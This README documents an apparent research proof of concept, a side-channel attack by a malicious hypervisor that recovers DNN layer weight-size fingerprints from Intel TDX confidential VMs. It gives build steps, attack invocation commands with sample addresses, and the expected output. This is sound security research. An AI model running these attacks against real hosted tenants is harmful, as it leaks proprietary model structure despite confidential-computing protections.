# TDXRay DNN Attack

Cross-core side-channel attacks on DNN models running inside Intel TDX
confidential VMs. A malicious hypervisor (VMM) recovers per-layer weight
matrix size fingerprints by combining page-fault synchronization with
CLDEMOTE-based L3 cache contention timing — without breaking TDX encryption
and without kernel modifications to the guest.

## Repository layout
tdxray/
├── pocs/
│   ├── 1-page-table-attack.c   # Gen 0: page-fault + LLC counters only
│   ├── 2-cldemote-attack.c     # Gen 1: + CLDEMOTE L3 contention timing
│   └── Makefile
├── tdxutils/                   # Kernel module (host side)
│   ├── tdxutils.h
│   ├── tdxutils_main.c
│   └── Makefile
└── dnn-victim/                 # Victim models (run inside TD guest)
├── gpa_helper.c
├── build.sh
├── victim_numpy_mlp.py
├── victim_numpy_cnn.py
├── victim_numpy_resnet.py
└── victim_numpy_transformer.py

## Hardware requirements

- Intel Xeon Scalable 4th or 5th generation (Sapphire Rapids / Emerald Rapids)
- TDX enabled in BIOS
- Linux kernel with Intel TDX patches (tested on 6.8.0-1028-intel)
- CLDEMOTE support required for Gen 1 attack (`CPUID.07H.ECX[25]=1`)

## Host setup

### 1. Build the kernel module

```bash
cd ~/tdxray/tdxutils
make
sudo insmod tdxutils.ko
ls /dev/tdxutils   # should exist
```

The module must be reloaded after every reboot:

```bash
sudo insmod ~/tdxray/tdxutils/tdxutils.ko
```

### 2. Build the attack binaries

```bash
cd ~/tdxray/pocs
make
```

This produces:
- `attack1` — page-fault + LLC counters (Gen 0)
- `attack`  — + CLDEMOTE contention timing (Gen 1)

## TD guest setup

### 1. Start the TD guest

```bash
sudo ~/tdx/guest-tools/run_td
```

### 2. SSH into the guest

```bash
ssh -p 10022 root@localhost
```

### 3. Set up the victim environment

```bash
cd /root/dnn-victim/

# Build the GPA helper shared library
bash build.sh

# Install NumPy if not already present
pip3 install numpy
```

## Running the attack

### Step 1 — Start the victim inside the TD guest

Pick a model and run it. It will print the GPAs of all marker pages on startup.

```bash
# MLP (3 FC layers, monotonically decreasing L3 pressure)
python3 victim_numpy_mlp.py

# CNN (conv + pool + FC layers)
python3 victim_numpy_cnn.py

# Tiny ResNet (two residual blocks + classifier)
python3 victim_numpy_resnet.py

# Mini Transformer (QKV + attention + FFN + classifier)
python3 victim_numpy_transformer.py
```

Example output:
MODEL: NUMPY_MLP
Inference start marker GPA: 0x12661cf40
Layer 1 start marker GPA:   0x12663ff50
Layer 1 end marker GPA:     0x126662f60
Layer 2 start marker GPA:   0x123893f70
Layer 2 end marker GPA:     0x1238b6f80
Layer 3 start marker GPA:   0x1238d9f90
Layer 3 end marker GPA:     0x1238fcfa0
Termination marker GPA:     0x126b20fb0

### Step 2 — Run the host attack binary

Open a separate terminal on the host. Copy the GPAs printed by the victim and
pass them in order (INF_START, L1_START, L1_END, ..., TERM):

```bash
# MLP
sudo ./attack mlp \
    0x12661cf40 0x12663ff50 0x126662f60 \
    0x123893f70 0x1238b6f80 \
    0x1238d9f90 0x1238fcfa0 \
    0x126b20fb0

# CNN
sudo ./attack cnn \
    <INF_START> <CONV_START> <CONV_END> \
    <POOL_START> <POOL_END> \
    <FC1_START> <FC1_END> \
    <TERM>

# ResNet
sudo ./attack resnet \
    <INF_START> \
    <BLOCK1_START> <BLOCK1_END> \
    <BLOCK2_START> <BLOCK2_END> \
    <CLASSIFIER_START> <CLASSIFIER_END> \
    <TERM>

# Transformer
sudo ./attack transformer \
    <INF_START> \
    <QKV_START> <QKV_END> \
    <ATTENTION_START> <ATTENTION_END> \
    <FFN_START> <FFN_END> \
    <CLASSIFIER_START> <CLASSIFIER_END> \
    <TERM>
```

### Step 3 — Save results

```bash
sudo ./attack mlp <GPAs...> | tee results_mlp.txt
```

## Reading the output

Each row corresponds to one marker page fault:
count  time_ns  delta_ns  gpa  marker  llc_refs  llc_misses  baseline_cyc  post_cyc

- `baseline_cyc` — probe buffer read latency before the layer ran (L3 speed)
- `post_cyc`     — probe buffer read latency after the layer ran
- `post_cyc - baseline_cyc` — contention delta, proportional to weight matrix size

Expected fingerprints (MLP):

| Layer | Weight matrix      | Expected delta |
|-------|--------------------|----------------|
| L1    | 406×2048 (~3.2 MB) | Large          |
| L2    | 2048×1024 (~8 MB)  | Medium         |
| L3    | 1024×128 (~0.5 MB) | Small          |

## Troubleshooting

**`/dev/tdxutils` not found**
```bash
sudo insmod ~/tdxray/tdxutils/tdxutils.ko
```

**`It seems like no TDX VM is currently running`**
The TD guest is not running. Start it first with `sudo ~/tdx/guest-tools/run_td`.

**All LLC refs = 0 / baseline_cyc = 0**
Marker GPAs are colliding on the same 2MB page. The victim's `make_marker()`
allocates 8MB per marker to avoid this, but if the victim was modified or
memory layout changed, GPAs may overlap. Verify with:
```bash
python3 -c "
gpas = [<your GPAs here>]
for g in gpas:
    print(hex(g & ~((1<<21)-1)))
"
```
All values must be unique.

**SSH to guest times out**
The TD guest may not be running. Check:
```bash
ps aux | grep qemu
```

**Server unresponsive after loading kernel module**
Loading a broken kernel module can hang the host. If ping works but SSH hangs,
the server needs a hard reboot. Contact the lab administrator.

## Notes on files not in this repository

The following files from the original TDXRay repository are not modified by
this project and should be taken from the original source:

- `tdxutils/tdxutils_access_monitor.c`
- `tdxutils/tdxutils_mwait.c`
- `tdxutils/tdxutils_pmc.c`
- `tdxutils/address_tree.h`
- `tdxutils/device_register.h`
- `tdxutils/Makefile`
- `pocs/2-load-probe.c`
- `pocs/3-probe-mwait.c`
- `pocs/4-tsx-probe.c`
- `pocs/u1-resolve-gpa.c`
- `pocs/u2-contend-code.c`
- `pocs/u3-split-single-page.c`
- `modkmap/`
- `prompt-recovery/`
